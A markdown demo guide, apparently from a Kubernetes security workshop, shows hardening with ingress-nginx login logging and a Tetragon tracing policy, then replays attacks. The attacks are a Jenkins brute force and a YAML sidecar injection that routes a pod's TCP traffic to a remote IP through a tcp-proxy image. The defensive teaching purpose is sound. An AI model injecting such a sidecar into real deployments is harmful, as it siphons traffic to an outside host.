# Secure Env

After noticing strange behavior on test environment, we want to secure our prod env.
Therefore, some actions have been taken by Head Of Security.

* We force all our employees to change their passwords.
* We deploy an ingress-nginx in front of jenkins to log all the logins.
* We deploy tetragon to observe the root console of K8s.
* We define a tetragon tracing policy that prevents changing haproxy files.

# Attack Again & Defend

## Jenkins Bruteforce

The attacker tries to bruteforce and login to jenkins on the test env again and this time we get the login attempts in the logs:

```bash
kubectl get pod -n ingress-nginx
kubectl logs <Ingress-Controller-Pod-Name> -f -n ingress-nginx
```

## K8s Pod TCP Traffic Routing

The attacker switches to prod env on octant and tries to inject a sidecar container in the app pod, which routes all the tcp traffic to a remote server.

>**Note**
>in order to show that, the TetragonPolicy must be deleted beforehand: ```kubectl delete TracingPolicy haproxy``` So delete it on `test` environment first, for example.

Edit the app deployment:

```bash
kubectl edit deployment/conduit-backend
```


Inject the sidecar container, directly below `containers` on column 0
Also see [snippet](./snippets/sidecar.yaml) for live demo

```bash..
      - env:
        - name: LISTEN
          value: ":8081"
        - name: TALK
          value: "34.118.40.42:443"
        name: sidecar
        image: tecnativa/tcp-proxy
        imagePullPolicy: Always
```

The new container will not be deployed properly, since a SigKill will be sent to end that process from the tetragon policy we defined before. This can be checked using the following command:

```bash
kubectl get pod -n conduit-app
```

### TEST

### PROD
Switch to PROD via
```kubectl config use-context gke_thorsten-jakoby-tj-projekt_europe-west3_conduit-k8s-prod```


An error status will be noticed for the pods as in the following example:

```bash
conduit-backend-fdc76f894-596d6            1/2     Error              4 (51s ago)   98s
```

We get info about those trials to inject the sidecar and the SigKill action in the tetragon logs as follows:

```bash
kubectl logs -n kube-system ds/tetragon -c export-stdout -f | tetra getevents -o compact
```

You will see something like this in the logs:
![tetragon logs](./images/tetragonLogs.png "Tetragon Logs")
